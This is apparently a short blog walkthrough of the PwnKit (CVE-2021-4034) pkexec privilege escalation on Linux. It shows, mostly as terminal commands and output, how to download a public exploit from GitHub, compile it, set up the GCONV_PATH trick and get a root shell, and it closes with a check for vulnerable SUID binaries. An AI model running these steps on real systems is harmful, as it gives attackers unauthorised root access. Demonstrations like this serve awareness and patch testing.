**PwnKit (CVE-2021-4034) - Local Privilege Escalation** 
This will be a short one. It's about local privilege escalation vulnerability (CVE-2021-4034) with public available exploit named _PwnKit._

Original Post: [https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)

> Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged ones. \[...] It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission)." (Wikipedia)


Since _pkexec_ is installed on almost every Linux system and _pkexec_ almost always has SUID-bit set it means that vulnerability that is "that" trivial to exploit (...once it's known how...) is really bad.&#x20;

So let's try one of the exploits available on GitHub: [https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)

```
[luka@localhost shm]$ wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c
...
Saving to: ‘pwnkit.c’

[luka@localhost shm]$ wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
...
Saving to: ‘cve-2021-4034.c’

100%[===================================================================================================================================================================================================>] 274         --.-K/s   in 0s

2022-01-27 07:14:51 (10.9 MB/s) - ‘cve-2021-4034.c’ saved [274/274]
```

After having _cve-2021-4034.c_ and _pwnkit.c_ on the system. Root is only few commands away. (Exploit needs compilation!). Its also possible to use _Makefile_ to make it even more easier (kudos to [https://github.com/berdav](https://github.com/berdav)).

```
[luka@localhost shm]$ cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
[luka@localhost shm]$ cc -Wall cve-2021-4034.c -o cve-2021-4034
[luka@localhost shm]$ echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
[luka@localhost shm]$ mkdir -p GCONV_PATH=.
[luka@localhost shm]$ cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
[luka@localhost shm]$
```

So that's it. Exploit is compiled and everything has been set (read about the exploit on the original page for more information how it works)

```
[luka@localhost shm]$ whoami
luka
[luka@localhost shm]$ id
uid=1000(luka) gid=1000(luka) groups=1000(luka),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[luka@localhost shm]$ ./cve-2021-4034
sh-4.2# id
uid=1000(luka) gid=1000(luka) euid=0(root) groups=1000(luka),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2# whoami
root
```

So that's it. Trivial to exploit - check if your system is exploitable (if it has SUID bit set on pkexec binary).

```
[luka@localhost shm]$ find / -perm /4000 2>/dev/null
...
/usr/bin/pkexec
...
```
...yes you can add _| grep pkexec_ at the end
